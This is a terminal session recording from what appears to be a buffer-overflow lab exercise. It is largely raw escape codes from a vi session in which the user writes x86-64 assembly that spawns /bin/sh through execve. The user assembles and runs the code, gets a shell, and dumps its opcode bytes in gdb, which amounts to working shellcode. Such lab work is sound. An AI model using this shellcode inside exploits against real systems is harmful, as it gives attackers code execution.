Script started on Mon 07 Mar 2016 06:21:57 PM EST
]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ as [K[K[Kvi part2.s
[?1049h[?1h=[2;1Hâ–½[6n[1;1H  [1;1H[1;36r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[36;1H"part2.s" 22L, 540C[>c[1;1H[33m.globl[m [36m_start
_start[m:[3;9H[34m# stripped down the code to the bare bones assembly[4;9H# Typically the constant is defined as right to left in ASCII[5;9H# for String "/bin/sh\0", then pushed and popped off the stack to retain thee[6;1H order[m[7;9H[36mmovq[m    $[31m0x1168732f6e69622f[m, %[36mrdi[8;9Hshl[m     $[31m0x08[m, %[36mrdi[9;9Hshr[m     $[31m0x08[m, %[36mrdi[11;9Hpushq[m   %[36mrdi[m[13;9H[34m# since the value in %rdi should point to an address we push it on the stack[m[14;9H[36mmovq[m    %[36mrsp[m, %[36mrdi[m[15;9H[34m# System call number 59 in decimal corresponds to execve()[m[16;9H[36mxorq[m    %[36mrax[m, %[36mrax[17;9Hxorq[m    %[36mrsi[m, %[36mrsi[18;9Hxorq[m    %[36mrdx[m, %[36mrdx[20;9Hmovb[m    $[31m0x3B[m, %[36mal[21;9Hsyscall[m


[1m[34m~                                                                                   [25;1H~                                                                                   [26;1H~                                                                                   [27;1H~                                                                                   [28;1H~                                                                                   [29;1H~                                                                                   [30;1H~                                                                                   [31;1H~                                                                                   [32;1H~                                                                                   [33;1H~                                                                                   [34;1H~                                                                                   [35;1H~                                                                                   [m[36;67H1,1[11CAll[1;1H[?12l[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?25l[36;67H2[2;1H[?12l[?25h[?25l[36;67H3,1-8[3;8H[?12l[?25h[?25l[36;67H4[4;8H[?12l[?25h[?25l[36;67H5[5;8H[?12l[?25h[?25l[36;69H2-9[5;9H[?12l[?25h[?25l[36;69H3-10[5;10H[?12l[?25h[?25l[36;69H4-11[5;11H[?12l[?25h[?25l[36;69H5-12[5;12H[?12l[?25h[?25l[36;69H6-13[5;13H[?12l[?25h[?25l[36;69H7-14[5;14H[?12l[?25h[?25l[36;69H8-15[5;15H[?12l[?25h[?25l[36;69H9-16[5;16H[?12l[?25h[?25l[36;69H10-17[5;17H[?12l[?25h[?25l[36;70H1-18[5;18H[?12l[?25h[?25l[36;70H2-19[5;19H[?12l[?25h[?25l[36;70H3-20[5;20H[?12l[?25h[?25l[36;70H4-21[5;21H[?12l[?25h[?25l[36;70H5-22[5;22H[?12l[?25h[?25l[36;70H6-23[5;23H[?12l[?25h[?25l[36;70H7-24[5;24H[?12l[?25h[?25l[36;70H8-25[5;25H[?12l[?25h[?25l[36;70H9-26[5;26H[?12l[?25h[?25l[36;69H20-27[5;27H[?12l[?25h[?25l[36;70H1-28[5;28H[?12l[?25h[?25l[36;70H2-29[5;29H[?12l[?25h[?25l[36;70H3-30[5;30H[?12l[?25h[?25l[36;70H4-31[5;31H[?12l[?25h[?25l[36;70H5-32[5;32H[?12l[?25h[?25l[36;70H6-33[5;33H[?12l[?25h[?25l[36;70H7-34[5;34H[?12l[?25h[?25l[36;70H8-35[5;35H[?12l[?25h[?25l[36;70H9-36[5;36H[?12l[?25h[?25l[36;69H30-37[5;37H[?12l[?25h[?25l[36;70H1-38[5;38H[?12l[?25h[?25l[36;70H2-39[5;39H[?12l[?25h[?25l[36;70H3-40[5;40H[?12l[?25h[?25l[36;70H4-41[5;41H[?12l[?25h[?25l[36;70H5-42[5;42H[?12l[?25h[?25l[36;70H6-43[5;43H[?12l[?25h[?25l[36;70H7-44[5;44H[?12l[?25h[?25l[36;70H8-45[5;45H[?12l[?25h[?25l[36;70H9-46[5;46H[?12l[?25h[?25l[36;69H40-47[5;47H[?12l[?25h[?25l[36;70H1-48[5;48H[?12l[?25h[?25l[36;70H2-49[5;49H[?12l[?25h[?25l[36;70H3-50[5;50H[?12l[?25h[?25l[36;70H4-51[5;51H[?12l[?25h[?25l[36;70H5-52[5;52H[?12l[?25h[?25l[36;70H6-53[5;53H[?12l[?25h[?25l[36;70H7-54[5;54H[?12l[?25h[?25l[36;70H8-55[5;55H[?12l[?25h[?25l[36;70H9-56[5;56H[?12l[?25h[?25l[36;69H50-57[5;57H[?12l[?25h[?25l[36;70H1-58[5;58H[?12l[?25h[?25l[36;70H2-59[5;59H[?12l[?25h[?25l[36;70H3-60[5;60H[?12l[?25h[?25l[36;70H4-61[5;61H[?12l[?25h[?25l[36;70H5-62[5;62H[?12l[?25h[?25l[36;70H6-63[5;63H[?12l[?25h[?25l[36;70H7-64[5;64H[?12l[?25h[?25l[36;70H8-65[5;65H[?12l[?25h[?25l[36;70H7-64[5;64H[?12l[?25h[?25l[36;70H6-63[5;63H[?12l[?25h[?25l[36;70H5-62[5;62H[?12l[?25h[?25l[36;70H4-61[5;61H[?12l[?25h[?25l[36;70H3-60[5;60H[?12l[?25h[?25l[36;70H2-59[5;59H[?12l[?25h[?25l[36;70H3-60[5;60H[?12l[?25h[?25l[36;70H4-61[5;61H[?12l[?25h[?25l[36;70H5-62[5;62H[?12l[?25h[?25l[36;1H[1m-- INSERT --[m[36;13H[K[36;67H5,55-62[7CAll[5;62H[?12l[?25h[?25l[34mthe stack to retain the  [6;1Horder[m[6;6H[K[36;70H4-61[5;61H[?12l[?25h[?25l[34mthe stack to retain the oo[6;1Hrder[m[6;5H[K[36;70H3-60[5;60H[?12l[?25h[?25l[34mthe stack to retain the orr[6;1Hder[m[6;4H[K[36;70H2-59[5;59H[?12l[?25h[?25l[34mthe stack to retain the ordd[6;1Her[m[6;3H[K[36;70H1-58[5;58H[?12l[?25h[?25l[34mthe stack to retain the ordee[6;1Hr[m[6;2H[K[36;70H0-57[5;57H[?12l[?25h[?25l[5;35r[35;1H
[1;36r[5;1H [7C[34m# for String "/bin/sh\0", then pushed and poppethe stack to retain the order[m[35;1H[1m[34m~                                                                                   [m[36;67H[K[36;67H5,49-56[7CAll[5;56H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;84H[K[36;70H8-55[5;55H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;83H[K[36;70H7-54[5;54H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;82H[K[36;70H6-53[5;53H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;81H[K[36;70H5-52[5;52H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;80H[K[36;70H4-51[5;51H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;79H[K[36;70H3-50[5;50H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;78H[K[36;70H2-49[5;49H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;77H[K[36;70H1-48[5;48H[?12l[?25h[?25l[34mthe stack to retain the order[m[5;76H[K[36;70H0-47[5;47H[?12l[?25h[?25l[34mothe stack to retain the order[m[36;70H1-48[5;48H[?12l[?25h[?25l[34mnthe stack to retain the order[m[36;70H2-49[5;49H[?12l[?25h[?25l[34m the stack to retain the order[m[36;70H3-50[5;50H[?12l[?25h[?25l[36;69H72-79[5;79H[?12l[?25h[?25l[5;78H[K[36;70H1-78[5;78H[?12l[?25h[?25l[5;77H[K[36;70H0-77[5;77H[?12l[?25h[?25l[5;76H[K[36;69H69-76[5;76H[?12l[?25h[?25l[5;75H[K[36;70H8-75[5;75H[?12l[?25h[?25l[5;74H[K[36;70H7-74[5;74H[?12l[?25h[?25l[5;73H[K[36;70H6-73[5;73H[?12l[?25h[?25l[5;72H[K[36;70H5-72[5;72H[?12l[?25h[?25l[5;71H[K[36;70H4-71[5;71H[?12l[?25h[?25l[5;70H[K[36;70H3-70[5;70H[?12l[?25h[?25l[5;69H[K[36;70H2-69[5;69H[?12l[?25h[?25l[5;68H[K[36;70H1-68[5;68H[?12l[?25h[?25l[5;67H[K[36;70H0-67[5;67H[?12l[?25h[?25l[5;66H[K[36;69H59-66[5;66H[?12l[?25h[?25l[5;65H[K[36;70H8-65[5;65H[?12l[?25h[?25l[5;64H[K[36;70H7-64[5;64H[?12l[?25h[?25l[5;63H[K[36;70H6-63[5;63H[?12l[?25h[?25l[34mh[m[36;70H7-64[5;64H[?12l[?25h[?25l[34ma[m[36;70H8-65[5;65H[?12l[?25h[?25l[34mv[m[36;70H9-66[5;66H[?12l[?25h[?25l[34me[m[36;69H60-67[5;67H[?12l[?25h[?25l[34m [m[36;70H1-68[5;68H[?12l[?25h[?25l[34mi[m[36;70H2-69[5;69H[?12l[?25h[?25l[34mt[m[36;70H3-70[5;70H[?12l[?25h[?25l[34m [m[36;70H4-71[5;71H[?12l[?25h[?25l[34mi[m[36;70H5-72[5;72H[?12l[?25h[?25l[34mn[m[36;70H6-73[5;73H[?12l[?25h[?25l[34m [m[36;70H7-74[5;74H[?12l[?25h[?25l[34me[m[36;70H8-75[5;75H[?12l[?25h[?25l[5;74H[K[36;70H7-74[5;74H[?12l[?25h[?25l[34mm[m[36;70H8-75[5;75H[?12l[?25h[?25l[34me[m[36;70H9-76[5;76H[?12l[?25h[?25l[34mm[m[36;69H70-77[5;77H[?12l[?25h[?25l[34mo[m[36;70H1-78[5;78H[?12l[?25h[?25l[34mr[m[36;70H2-79[5;79H[?12l[?25h[?25l[34my[m[36;70H3-80[5;80H[?12l[?25h[36;1H[K[5;79H[?25l[36;67H5,72-79[7CAll[5;79H[?12l[?25h[?25l[36;67H[K[36;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"part2.s" 22L, 529C written
[?1l>[?12l[?25h[?1049l]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ as part2.s -o part2.o
]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ ld part2.o -o part2
]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ ./part2
$ whoami
seclab
$ exit
]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ gdb ./part2
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./part2...(no debugging symbols found)...done.
(gdb) disas /r _main[K[K[K[Ksa[Ktart
Dump of assembler code for function _start:
   0x0000000000400078 <+0>:	48 bf 2f 62 69 6e 2f 73 68 11	movabs $0x1168732f6e69622f,%rdi
   0x0000000000400082 <+10>:	48 c1 e7 08	shl    $0x8,%rdi
   0x0000000000400086 <+14>:	48 c1 ef 08	shr    $0x8,%rdi
   0x000000000040008a <+18>:	57	push   %rdi
   0x000000000040008b <+19>:	48 89 e7	mov    %rsp,%rdi
   0x000000000040008e <+22>:	48 31 c0	xor    %rax,%rax
   0x0000000000400091 <+25>:	48 31 f6	xor    %rsi,%rsi
   0x0000000000400094 <+28>:	48 31 d2	xor    %rdx,%rdx
   0x0000000000400097 <+31>:	b0 3b	mov    $0x3b,%al
   0x0000000000400099 <+33>:	0f 05	syscall 
End of assembler dump.
(gdb) quit
]0;seclab@SecurityLabUbuntu64: ~/BufferOverflowseclab@SecurityLabUbuntu64:~/BufferOverflow$ exit[K[K[K[Kgdb [K[K[K[Kexit
Script done on Mon 07 Mar 2016 06:24:40 PM EST
